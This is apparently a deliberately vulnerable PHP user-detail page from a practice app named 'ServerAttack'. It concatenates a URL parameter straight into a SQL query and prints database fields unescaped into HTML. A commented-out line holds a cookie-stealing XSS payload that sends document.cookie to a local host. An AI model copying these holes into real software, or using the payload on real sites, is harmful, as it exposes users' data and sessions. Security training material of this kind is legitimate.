
<?php

    // Database connection parameters
    $host = "localhost";
    $username = "root";
    $password = "";
    $database = "server_attack";

    // Create a connection
    $conn = new mysqli($host, $username, $password, $database);

    // Check the connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    // SELECT query
    $sql = "SELECT * FROM user where user_id = " . $_GET["id"];
    $result = $conn->query($sql);

    // Check if the query was successful
    if ($result) {
        // Fetch data
        while ($row = $result->fetch_assoc()) {
            // Process each row of data
            $id = $row['user_id'];
            $name = $row['user_name'];
            $email = $row['user_email'];
            $salary = $row['salary'];
            $comment = $row['comment'];
            // echo "ID: " . $row['user_id'] . " Name: " . $row['user_name'] . "<br>";
        }

        // Free the result set
        $result->free();
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }

    // Close the connection
    $conn->close();
?>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- CSRF Token -->
    <meta name="csrf-token" content="C4ym2m0WPACQXMtqinbVuwIRnYReABtvuZ95EzHi">

    <title>ServerAttack</title>

    <!-- Scripts -->
    <script src="http://127.0.0.1:8000/js/app.js" defer></script>

    <!-- Fonts -->
    <link rel="dns-prefetch" href="//fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css?family=Nunito" rel="stylesheet">

    <!-- Styles -->
    <link href="http://127.0.0.1:8000/css/app.css" rel="stylesheet">

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</head>
<body>
    <div id="app">
        <nav class="navbar navbar-expand-md navbar-light bg-info shadow-sm">
            <div class="container">
                <a class="navbar-brand" href="http://127.0.0.1:8000">
                    ServerAttack
                </a>
                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>

                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <!-- Left Side Of Navbar -->
                    <ul class="navbar-nav mr-auto">

                    </ul>

                    <!-- Right Side Of Navbar -->
                    <ul class="navbar-nav ml-auto">
                        <!-- Authentication Links -->
                                                    <li class="nav-item">
                                <a class="nav-link" href="http://127.0.0.1:8000/user/register">Register</a>
                            </li>
                            <li class="nav-item dropdown">
                                <a id="navbarDropdown" class="nav-link dropdown-toggle" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" v-pre>
                                    b
                                </a>

                                <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown">
                                    <a class="dropdown-item" href="http://127.0.0.1:8000/logout"
                                       onclick="event.preventDefault();
                                                     document.getElementById('logout-form').submit();">
                                        Logout
                                    </a>

                                    <form id="logout-form" action="http://127.0.0.1:8000/logout" method="POST" class="d-none">
                                        <input type="hidden" name="_token" value="C4ym2m0WPACQXMtqinbVuwIRnYReABtvuZ95EzHi">                                    </form>
                                </div>
                            </li>
                        </ul>
                </div>
            </div>
        </nav>

        <main class="py-4">
                <div class="container mt-3">
        <h2>User Detail</h2>

        <div class="form-group row">
            <label for="inputEmail3" class="col-sm-2 col-form-label">Name</label>
            <div class="col-sm-5">
                <?php
                //  $comment = "<script>document.location='http://127.0.0.1/cookie/cookie='+document.cookie</script>";
                ?>
                <label class="form-control-plaintext text-light bg-primary text-light bg-primary"><?php echo $name; ?></label>
            </div>
        </div>
        <div class="form-group row">
            <label for="inputEmail3" class="col-sm-2 col-form-label">Email</label>
            <div class="col-sm-5">
                <input type="text" readonly class="form-control-plaintext text-light bg-primary" id="staticEmail2" value="<?php echo $email; ?>">
            </div>
        </div>
        <div class="form-group row">
            <label for="inputEmail3" class="col-sm-2 col-form-label">Salary</label>
            <div class="col-sm-5">
                <input type="text" readonly class="form-control-plaintext text-light bg-primary" id="staticEmail2" value=<?php echo $salary; ?>>
            </div>
        </div>
        <div class="form-group row">
            <label for="inputEmail3" class="col-sm-2 col-form-label">Comment2</label>
            <div class="col-sm-5">
                <input type="text" readonly class="form-control-plaintext text-light bg-primary" id="staticEmail2" value="<?php echo $comment; ?>">
            </div>
        </div>
        <div class="form-group row">
            <label for="inputEmail3" class="col-sm-2 col-form-label"></label>
            <a class="col-sm-2 btn btn-success" href="http://127.0.0.1:8000/user/list">Back</a>
        </div>
    </div>
        </main>
    </div>
</body>
